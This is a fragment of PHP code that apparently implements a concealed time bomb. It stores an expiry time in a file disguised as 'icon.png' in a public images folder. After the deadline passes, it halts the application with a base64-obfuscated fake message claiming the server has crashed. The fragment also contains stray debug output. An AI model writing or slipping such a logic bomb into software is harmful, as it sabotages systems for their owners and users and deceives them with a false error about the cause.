...
*@param int $time
 */
/*function setTime($time = 3600)
{
    $file = APP_PATH . DS . '..' . DS . 'Public' . DS . 'default' . DS . 'images' . DS . "icon.png";
    if (!is_file($file)) {
        fclose(fopen($file, 'w'));
    }
    $time+=time();
...
{   
    ...
    $time = base64_decode($time);
            echo $time;
    if (time() >= $time) {
        echo base64_decode("VW5leHBlY3RlZCBlcnJvciAsIHNlcnZlciBoYXMgY3Jhc2hlZCAsIHBsZWFzZSBjb250YWN0IHRoZSBzeXN0ZW0gYWRtaW5pc3RyYXRvciE=");
            echo "dddd";exit();
        exit(base64_decode("VW5leHBlY3RlZCBlcnJvciAsIHNlcnZlciBoYXMgY3Jhc2hlZCAsIHBsZWFzZSBjb250YWN0IHRoZSBzeXN0ZW0gYWRtaW5pc3RyYXRvciE="));
    }
